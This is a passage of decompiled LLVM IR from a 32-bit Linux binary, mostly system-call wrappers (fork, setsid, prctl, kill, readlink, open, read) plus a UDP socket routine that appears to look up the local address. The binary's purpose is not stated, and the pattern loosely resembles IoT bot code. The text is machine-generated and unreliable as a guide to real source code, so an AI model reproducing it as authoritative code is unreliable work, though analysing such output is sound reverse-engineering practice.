  %v4_804f680 = add i32 %v0_804f685, %tmp8
  %v5_804f680 = inttoptr i32 %v4_804f680 to i8*
  %v6_804f680 = load i8, i8* %v5_804f680, align 1
  %v17_804f680 = icmp eq i8 %v5_804f67c, %v6_804f680
  %v1_804f683 = icmp eq i1 %v17_804f680, false
  br i1 %v1_804f683, label %dec_label_pc_804f670, label %dec_label_pc_804f685

dec_label_pc_804f685:                             ; preds = %dec_label_pc_804f678
  %v1_804f685 = add i32 %v0_804f685, 1
  %v12_804f686 = icmp eq i32 %tmp9, %v1_804f685
  %v1_804f688 = icmp eq i1 %v12_804f686, false
  br i1 %v1_804f688, label %dec_label_pc_804f672, label %dec_label_pc_804f65a

; uselistorder directives
  uselistorder i32 %v0_804f673, { 2, 0, 1 }
  uselistorder i32 %v0_804f685, { 1, 0 }
  uselistorder i32 %v1_804f672, { 1, 0 }
  uselistorder i32 %tmp10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f65a, { 1, 0, 2 }
}

define i32 @function_804f800() local_unnamed_addr {
dec_label_pc_804f800:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_804f80d = call i32 @function_804ffeb(i32 16)
  %v1_804f812 = inttoptr i32 %v1_804f80d to i32*
  store i32 0, i32* %v1_804f812, align 4
  %v4_804f81f = call i32 @function_8050297(i32 2, i32 2, i32 0, i32 %v1_804f80d)
  store i32 %v4_804f81f, i32* %esi.global-to-local, align 4
  %v10_804f82b = icmp eq i32 %v4_804f81f, -1
  br i1 %v10_804f82b, label %dec_label_pc_804f872, label %dec_label_pc_804f830

dec_label_pc_804f830:                             ; preds = %dec_label_pc_804f800
  %v2_804f830 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804f830, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804f84f = call i32 @function_80500bc(i32 %v4_804f81f, i32 %v2_804f830, i32 16)
  %v2_804f857 = ptrtoint i32* %stack_var_-12 to i32
  %v0_804f85d = load i32, i32* %esi.global-to-local, align 4
  %v3_804f85e = call i32 @function_80500e7(i32 %v0_804f85d, i32 %v2_804f830, i32 %v2_804f857)
  %v1_804f866 = call i32 @function_804fab3(i32 %v0_804f85d)
  br label %dec_label_pc_804f872

dec_label_pc_804f872:                             ; preds = %dec_label_pc_804f800, %dec_label_pc_804f830
  %v0_804f877 = phi i32 [ 0, %dec_label_pc_804f800 ], [ 134744072, %dec_label_pc_804f830 ]
  ret i32 %v0_804f877

; uselistorder directives
  uselistorder i32 %v4_804f81f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_80500bc, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8050297, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f872, { 1, 0 }
}

define i32 @function_804fa1d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fa1d:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804fa1d = load i32, i32* @edi, align 4
  %v0_804fa1e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804fa32 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804fa3c = icmp ugt i32 %v1_804fa32, 2
  br i1 %v6_804fa3c, label %dec_label_pc_804fa4c, label %dec_label_pc_804fa3e

dec_label_pc_804fa3e:                             ; preds = %dec_label_pc_804fa1d
  %v4_804fa42 = call i32 @function_804fa74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804fa32)
  br label %dec_label_pc_804fa6e

dec_label_pc_804fa4c:                             ; preds = %dec_label_pc_804fa1d
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fa54 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804fa54, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804fa54, -4095
  br i1 %tmp17, label %dec_label_pc_804fa6c, label %dec_label_pc_804fa60

dec_label_pc_804fa60:                             ; preds = %dec_label_pc_804fa4c
  %v1_804fa60 = call i32 @function_804ffeb(i32 %v0_804fa1e)
  %v0_804fa65 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fa65 = sub i32 0, %v0_804fa65
  %v2_804fa67 = inttoptr i32 %v1_804fa60 to i32*
  store i32 %v1_804fa65, i32* %v2_804fa67, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fa6c

dec_label_pc_804fa6c:                             ; preds = %dec_label_pc_804fa4c, %dec_label_pc_804fa60
  %v0_804fa6c = phi i32 [ %v2_804fa54, %dec_label_pc_804fa4c ], [ -1, %dec_label_pc_804fa60 ]
  br label %dec_label_pc_804fa6e

dec_label_pc_804fa6e:                             ; preds = %dec_label_pc_804fa3e, %dec_label_pc_804fa6c
  %v0_804fa73 = phi i32 [ %v4_804fa42, %dec_label_pc_804fa3e ], [ %v0_804fa6c, %dec_label_pc_804fa6c ]
  store i32 %v0_804fa1e, i32* @ebx, align 4
  store i32 %v0_804fa1d, i32* @edi, align 4
  ret i32 %v0_804fa73

; uselistorder directives
  uselistorder i32 %v2_804fa54, { 1, 0, 2 }
  uselistorder i32 %v0_804fa1e, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804fa6e, { 1, 0 }
  uselistorder label %dec_label_pc_804fa6c, { 1, 0 }
}

define i32 @function_804fa74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fa74:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa74 = load i32, i32* @edi, align 4
  store i32 %v0_804fa74, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804fa8c = load i32, i32* @ebx, align 4
  %v1_804fa94 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804fa94, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804fa94, -4095
  br i1 %tmp12, label %dec_label_pc_804faac, label %dec_label_pc_804faa0

dec_label_pc_804faa0:                             ; preds = %dec_label_pc_804fa74
  %v1_804faa0 = call i32 @function_804ffeb(i32 %v0_804fa8c)
  %v0_804faa5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804faa5 = sub i32 0, %v0_804faa5
  %v2_804faa7 = inttoptr i32 %v1_804faa0 to i32*
  store i32 %v1_804faa5, i32* %v2_804faa7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fab1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804faac

dec_label_pc_804faac:                             ; preds = %dec_label_pc_804fa74, %dec_label_pc_804faa0
  %v2_804fab1 = phi i32 [ %v0_804fa74, %dec_label_pc_804fa74 ], [ %v2_804fab1.pre, %dec_label_pc_804faa0 ]
  %v0_804faac = phi i32 [ %v1_804fa94, %dec_label_pc_804fa74 ], [ -1, %dec_label_pc_804faa0 ]
  store i32 %v2_804fab1, i32* %edi.global-to-local, align 4
  ret i32 %v0_804faac

; uselistorder directives
  uselistorder i32 %v1_804fa94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804faac, { 1, 0 }
}

define i32 @function_804fab3(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fab3:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fab3 = load i32, i32* @edi, align 4
  store i32 %v0_804fab3, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fabb = load i32, i32* @ebx, align 4
  %v1_804fac3 = call i32 @close(i32 %arg1)
  store i32 %v0_804fabb, i32* @ebx, align 4
  store i32 %v1_804fac3, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_804fac3, -4095
  br i1 %tmp9, label %dec_label_pc_804fadb, label %dec_label_pc_804facf

dec_label_pc_804facf:                             ; preds = %dec_label_pc_804fab3
  %v1_804facf = call i32 @function_804ffeb(i32 %v0_804fabb)
  %v0_804fad4 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fad4 = sub i32 0, %v0_804fad4
  %v2_804fad6 = inttoptr i32 %v1_804facf to i32*
  store i32 %v1_804fad4, i32* %v2_804fad6, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fadf.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fadb

dec_label_pc_804fadb:                             ; preds = %dec_label_pc_804fab3, %dec_label_pc_804facf
  %v2_804fadf = phi i32 [ %v0_804fab3, %dec_label_pc_804fab3 ], [ %v2_804fadf.pre, %dec_label_pc_804facf ]
  %v0_804fadb = phi i32 [ %v1_804fac3, %dec_label_pc_804fab3 ], [ -1, %dec_label_pc_804facf ]
  store i32 %v2_804fadf, i32* @edi, align 4
  ret i32 %v0_804fadb

; uselistorder directives
  uselistorder i32 %v1_804fac3, { 1, 0, 2 }
  uselistorder i32 %v0_804fabb, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fadb, { 1, 0 }
}

define i32 @function_804fae1() local_unnamed_addr {
dec_label_pc_804fae1:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fae1 = load i32, i32* @ebx, align 4
  store i32 %v0_804fae1, i32* %stack_var_-4, align 4
  %v1_804faea = call i32 @fork(i32 %v0_804fae1)
  store i32 %v1_804faea, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804faea, -4095
  br i1 %tmp7, label %dec_label_pc_804fb01, label %dec_label_pc_804faf5

dec_label_pc_804faf5:                             ; preds = %dec_label_pc_804fae1
  %v1_804faf5 = call i32 @function_804ffeb(i32 %v0_804fae1)
  %v0_804fafa = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fafa = sub i32 0, %v0_804fafa
  %v2_804fafc = inttoptr i32 %v1_804faf5 to i32*
  store i32 %v1_804fafa, i32* %v2_804fafc, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fb05.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb01

dec_label_pc_804fb01:                             ; preds = %dec_label_pc_804fae1, %dec_label_pc_804faf5
  %v2_804fb05 = phi i32 [ %v0_804fae1, %dec_label_pc_804fae1 ], [ %v2_804fb05.pre, %dec_label_pc_804faf5 ]
  %v0_804fb01 = phi i32 [ %v1_804faea, %dec_label_pc_804fae1 ], [ -1, %dec_label_pc_804faf5 ]
  store i32 %v2_804fb05, i32* @ebx, align 4
  ret i32 %v0_804fb01

; uselistorder directives
  uselistorder i32 %v1_804faea, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fb01, { 1, 0 }
}

define i32 @function_804fb07() local_unnamed_addr {
dec_label_pc_804fb07:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb07 = load i32, i32* @ebx, align 4
  store i32 %v0_804fb07, i32* %stack_var_-4, align 4
  %v1_804fb10 = call i32 @getpid(i32 %v0_804fb07)
  store i32 %v1_804fb10, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fb10, -4095
  br i1 %tmp7, label %dec_label_pc_804fb27, label %dec_label_pc_804fb1b

dec_label_pc_804fb1b:                             ; preds = %dec_label_pc_804fb07
  %v1_804fb1b = call i32 @function_804ffeb(i32 %v0_804fb07)
  %v0_804fb20 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fb20 = sub i32 0, %v0_804fb20
  %v2_804fb22 = inttoptr i32 %v1_804fb1b to i32*
  store i32 %v1_804fb20, i32* %v2_804fb22, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fb2b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb27

dec_label_pc_804fb27:                             ; preds = %dec_label_pc_804fb07, %dec_label_pc_804fb1b
  %v2_804fb2b = phi i32 [ %v0_804fb07, %dec_label_pc_804fb07 ], [ %v2_804fb2b.pre, %dec_label_pc_804fb1b ]
  %v0_804fb27 = phi i32 [ %v1_804fb10, %dec_label_pc_804fb07 ], [ -1, %dec_label_pc_804fb1b ]
  %v2_804fb29 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fb29, i32* @edx, align 4
  store i32 %v2_804fb2b, i32* @ebx, align 4
  ret i32 %v0_804fb27

; uselistorder directives
  uselistorder i32 %v1_804fb10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fb27, { 1, 0 }
}

define i32 @function_804fb2d() local_unnamed_addr {
dec_label_pc_804fb2d:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb2d = load i32, i32* @ebx, align 4
  store i32 %v0_804fb2d, i32* %stack_var_-4, align 4
  %v1_804fb36 = call i32 @getppid(i32 %v0_804fb2d)
  store i32 %v1_804fb36, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fb36, -4095
  br i1 %tmp7, label %dec_label_pc_804fb4d, label %dec_label_pc_804fb41

dec_label_pc_804fb41:                             ; preds = %dec_label_pc_804fb2d
  %v1_804fb41 = call i32 @function_804ffeb(i32 %v0_804fb2d)
  %v0_804fb46 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fb46 = sub i32 0, %v0_804fb46
  %v2_804fb48 = inttoptr i32 %v1_804fb41 to i32*
  store i32 %v1_804fb46, i32* %v2_804fb48, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fb51.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb4d

dec_label_pc_804fb4d:                             ; preds = %dec_label_pc_804fb2d, %dec_label_pc_804fb41
  %v2_804fb51 = phi i32 [ %v0_804fb2d, %dec_label_pc_804fb2d ], [ %v2_804fb51.pre, %dec_label_pc_804fb41 ]
  %v0_804fb4d = phi i32 [ %v1_804fb36, %dec_label_pc_804fb2d ], [ -1, %dec_label_pc_804fb41 ]
  store i32 %v2_804fb51, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fb4d

; uselistorder directives
  uselistorder i32 %v1_804fb36, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fb4d, { 1, 0 }
}

define i32 @function_804fb53(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fb53:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb53 = load i32, i32* @edi, align 4
  store i32 %v0_804fb53, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fb6b = load i32, i32* @ebx, align 4
  %v2_804fb73 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_804fb73, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_804fb73, -4095
  br i1 %tmp12, label %dec_label_pc_804fb8b, label %dec_label_pc_804fb7f

dec_label_pc_804fb7f:                             ; preds = %dec_label_pc_804fb53
  %v1_804fb7f = call i32 @function_804ffeb(i32 %v0_804fb6b)
  %v0_804fb84 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fb84 = sub i32 0, %v0_804fb84
  %v2_804fb86 = inttoptr i32 %v1_804fb7f to i32*
  store i32 %v1_804fb84, i32* %v2_804fb86, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fb90.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb8b

dec_label_pc_804fb8b:                             ; preds = %dec_label_pc_804fb53, %dec_label_pc_804fb7f
  %v2_804fb90 = phi i32 [ %v0_804fb53, %dec_label_pc_804fb53 ], [ %v2_804fb90.pre, %dec_label_pc_804fb7f ]
  %v0_804fb8b = phi i32 [ %v2_804fb73, %dec_label_pc_804fb53 ], [ -1, %dec_label_pc_804fb7f ]
  store i32 %v2_804fb90, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fb8b

; uselistorder directives
  uselistorder i32 %v2_804fb73, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fb8b, { 1, 0 }
}

define i32 @function_804fb92(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fb92:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb92 = load i32, i32* @ebx, align 4
  store i32 %v0_804fb92, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fba5 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804fba5, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804fba5, -4095
  br i1 %tmp9, label %dec_label_pc_804fbbe, label %dec_label_pc_804fbb2

dec_label_pc_804fbb2:                             ; preds = %dec_label_pc_804fb92
  %v1_804fbb2 = call i32 @function_804ffeb(i32 %v0_804fb92)
  %v0_804fbb7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbb7 = sub i32 0, %v0_804fbb7
  %v2_804fbb9 = inttoptr i32 %v1_804fbb2 to i32*
  store i32 %v1_804fbb7, i32* %v2_804fbb9, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fbc2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fbbe

dec_label_pc_804fbbe:                             ; preds = %dec_label_pc_804fb92, %dec_label_pc_804fbb2
  %v2_804fbc2 = phi i32 [ %v0_804fb92, %dec_label_pc_804fb92 ], [ %v2_804fbc2.pre, %dec_label_pc_804fbb2 ]
  %v0_804fbbe = phi i32 [ %v2_804fba5, %dec_label_pc_804fb92 ], [ -1, %dec_label_pc_804fbb2 ]
  %v2_804fbc0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fbc0, i32* @edx, align 4
  store i32 %v2_804fbc2, i32* @ebx, align 4
  ret i32 %v0_804fbbe

; uselistorder directives
  uselistorder i32 %v2_804fba5, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fbbe, { 1, 0 }
}

define i32 @function_804fbc4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804fbc4:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804fbc5 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804fbcb = sdiv i32 %sext, 16777216
  %v4_804fbcf = ptrtoint i8* %arg1 to i32
  %v3_804fbd3 = and i32 %arg2, 64
  %v4_804fbd3 = icmp eq i32 %v3_804fbd3, 0
  br i1 %v4_804fbd3, label %dec_label_pc_804fbe4, label %dec_label_pc_804fbd8

dec_label_pc_804fbd8:                             ; preds = %dec_label_pc_804fbc4
  br label %dec_label_pc_804fbe4

dec_label_pc_804fbe4:                             ; preds = %dec_label_pc_804fbc4, %dec_label_pc_804fbd8
  store i32 %v4_804fbcf, i32* %ebx.global-to-local, align 4
  %v5_804fbef = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804fbcb)
  store i32 %v5_804fbef, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804fbef, -4095
  br i1 %tmp15, label %dec_label_pc_804fc07, label %dec_label_pc_804fbfb

dec_label_pc_804fbfb:                             ; preds = %dec_label_pc_804fbe4
  %v1_804fbfb = call i32 @function_804ffeb(i32 %v0_804fbc5)
  %v0_804fc00 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fc00 = sub i32 0, %v0_804fc00
  %v2_804fc02 = inttoptr i32 %v1_804fbfb to i32*
  store i32 %v1_804fc00, i32* %v2_804fc02, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc07

dec_label_pc_804fc07:                             ; preds = %dec_label_pc_804fbe4, %dec_label_pc_804fbfb
  %v0_804fc07 = phi i32 [ %v5_804fbef, %dec_label_pc_804fbe4 ], [ -1, %dec_label_pc_804fbfb ]
  store i32 %v0_804fbc5, i32* @ebx, align 4
  ret i32 %v0_804fc07

; uselistorder directives
  uselistorder i32 %v5_804fbef, { 1, 0, 2 }
  uselistorder i32 %v0_804fbc5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804fc07, { 1, 0 }
  uselistorder label %dec_label_pc_804fbe4, { 1, 0 }
}

define i32 @function_804fc0f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804fc0f:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fc10 = load i32, i32* @esi, align 4
  store i32 %v0_804fc10, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804fc28 = load i32, i32* @ebx, align 4
  %v5_804fc30 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_804fc30, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_804fc30, -4095
  br i1 %tmp12, label %dec_label_pc_804fc48, label %dec_label_pc_804fc3c

dec_label_pc_804fc3c:                             ; preds = %dec_label_pc_804fc0f
  %v1_804fc3c = call i32 @function_804ffeb(i32 %v0_804fc28)
  %v0_804fc41 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fc41 = sub i32 0, %v0_804fc41
  %v2_804fc43 = inttoptr i32 %v1_804fc3c to i32*
  store i32 %v1_804fc41, i32* %v2_804fc43, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804fc4b.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804fc48

dec_label_pc_804fc48:                             ; preds = %dec_label_pc_804fc0f, %dec_label_pc_804fc3c
  %v2_804fc4b = phi i32 [ %v0_804fc10, %dec_label_pc_804fc0f ], [ %v2_804fc4b.pre, %dec_label_pc_804fc3c ]
  %v0_804fc48 = phi i32 [ %v5_804fc30, %dec_label_pc_804fc0f ], [ -1, %dec_label_pc_804fc3c ]
  store i32 %v2_804fc4b, i32* %esi.global-to-local, align 4
  ret i32 %v0_804fc48

; uselistorder directives
  uselistorder i32 %v5_804fc30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc48, { 1, 0 }
}

define i32 @function_804fc4e(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fc4e:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc4e = load i32, i32* @edi, align 4
  store i32 %v0_804fc4e, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fc5e = load i32, i32* @ebx, align 4
  %v4_804fc66 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_804fc66, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804fc66, -4095
  br i1 %tmp12, label %dec_label_pc_804fc7e, label %dec_label_pc_804fc72

dec_label_pc_804fc72:                             ; preds = %dec_label_pc_804fc4e
  %v1_804fc72 = call i32 @function_804ffeb(i32 %v0_804fc5e)
  %v0_804fc77 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fc77 = sub i32 0, %v0_804fc77
  %v2_804fc79 = inttoptr i32 %v1_804fc72 to i32*
  store i32 %v1_804fc77, i32* %v2_804fc79, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fc82.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fc7e

dec_label_pc_804fc7e:                             ; preds = %dec_label_pc_804fc4e, %dec_label_pc_804fc72
  %v2_804fc82 = phi i32 [ %v0_804fc4e, %dec_label_pc_804fc4e ], [ %v2_804fc82.pre, %dec_label_pc_804fc72 ]
  %v0_804fc7e = phi i32 [ %v4_804fc66, %dec_label_pc_804fc4e ], [ -1, %dec_label_pc_804fc72 ]
  store i32 %v2_804fc82, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fc7e

; uselistorder directives
  uselistorder i32 %v4_804fc66, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc7e, { 1, 0 }
}

define i32 @function_804fc84(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fc84:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc84 = load i32, i32* @edi, align 4
  store i32 %v0_804fc84, i32* %stack_var_-4, align 4
  %v4_804fc88 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fc88, i32* %edi.global-to-local, align 4
  %v0_804fc94 = load i32, i32* @ebx, align 4
  %v7_804fc9c = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v7_804fc9c, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804fc9c, -4095
  br i1 %tmp13, label %dec_label_pc_804fcb4, label %dec_label_pc_804fca8

dec_label_pc_804fca8:                             ; preds = %dec_label_pc_804fc84
  %v1_804fca8 = call i32 @function_804ffeb(i32 %v0_804fc94)
  %v0_804fcad = load i32, i32* %edi.global-to-local, align 4
  %v1_804fcad = sub i32 0, %v0_804fcad
  %v2_804fcaf = inttoptr i32 %v1_804fca8 to i32*
  store i32 %v1_804fcad, i32* %v2_804fcaf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fcb8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fcb4

dec_label_pc_804fcb4:                             ; preds = %dec_label_pc_804fc84, %dec_label_pc_804fca8
  %v2_804fcb8 = phi i32 [ %v0_804fc84, %dec_label_pc_804fc84 ], [ %v2_804fcb8.pre, %dec_label_pc_804fca8 ]
  %v0_804fcb4 = phi i32 [ %v7_804fc9c, %dec_label_pc_804fc84 ], [ -1, %dec_label_pc_804fca8 ]
  store i32 %v2_804fcb8, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fcb4

; uselistorder directives
  uselistorder i32 %v7_804fc9c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fcb4, { 1, 0 }
}

define i32 @function_804fcba() local_unnamed_addr {
dec_label_pc_804fcba:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fcbb = load i32, i32* @esi, align 4
  store i32 %v0_804fcbb, i32* %stack_var_-8, align 4
  %v0_804fcd3 = load i32, i32* @ebx, align 4
  %v1_804fcdb = call i32 @int80_syscall(i32 142)
  store i32 %v0_804fcd3, i32* @ebx, align 4
  store i32 %v1_804fcdb, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804fcdb, -4095
  br i1 %tmp12, label %dec_label_pc_804fcf3, label %dec_label_pc_804fce7

dec_label_pc_804fce7:                             ; preds = %dec_label_pc_804fcba
  %v1_804fce7 = call i32 @function_804ffeb(i32 %v0_804fcd3)
  %v0_804fcec = load i32, i32* %esi.global-to-local, align 4
  %v1_804fcec = sub i32 0, %v0_804fcec
  %v2_804fcee = inttoptr i32 %v1_804fce7 to i32*
  store i32 %v1_804fcec, i32* %v2_804fcee, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804fcf6.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804fcf3

dec_label_pc_804fcf3:                             ; preds = %dec_label_pc_804fcba, %dec_label_pc_804fce7
  %v2_804fcf6 = phi i32 [ %v0_804fcbb, %dec_label_pc_804fcba ], [ %v2_804fcf6.pre, %dec_label_pc_804fce7 ]
  %v0_804fcf3 = phi i32 [ %v1_804fcdb, %dec_label_pc_804fcba ], [ -1, %dec_label_pc_804fce7 ]
  store i32 %v2_804fcf6, i32* @esi, align 4
  ret i32 %v0_804fcf3

; uselistorder directives
  uselistorder i32 %v1_804fcdb, { 1, 0, 2 }
  uselistorder i32 %v0_804fcd3, { 1, 0 }
  uselistorder label %dec_label_pc_804fcf3, { 1, 0 }
}

define i32 @function_804fcf9() local_unnamed_addr {
dec_label_pc_804fcf9:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fcf9 = load i32, i32* @ebx, align 4
  store i32 %v0_804fcf9, i32* %stack_var_-4, align 4
  %v1_804fd02 = call i32 @setsid(i32 %v0_804fcf9)
  store i32 %v1_804fd02, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fd02, -4095
  br i1 %tmp7, label %dec_label_pc_804fd19, label %dec_label_pc_804fd0d

dec_label_pc_804fd0d:                             ; preds = %dec_label_pc_804fcf9
  %v1_804fd0d = call i32 @function_804ffeb(i32 %v0_804fcf9)
  %v0_804fd12 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fd12 = sub i32 0, %v0_804fd12
  %v2_804fd14 = inttoptr i32 %v1_804fd0d to i32*
  store i32 %v1_804fd12, i32* %v2_804fd14, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fd1d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fd19

dec_label_pc_804fd19:                             ; preds = %dec_label_pc_804fcf9, %dec_label_pc_804fd0d
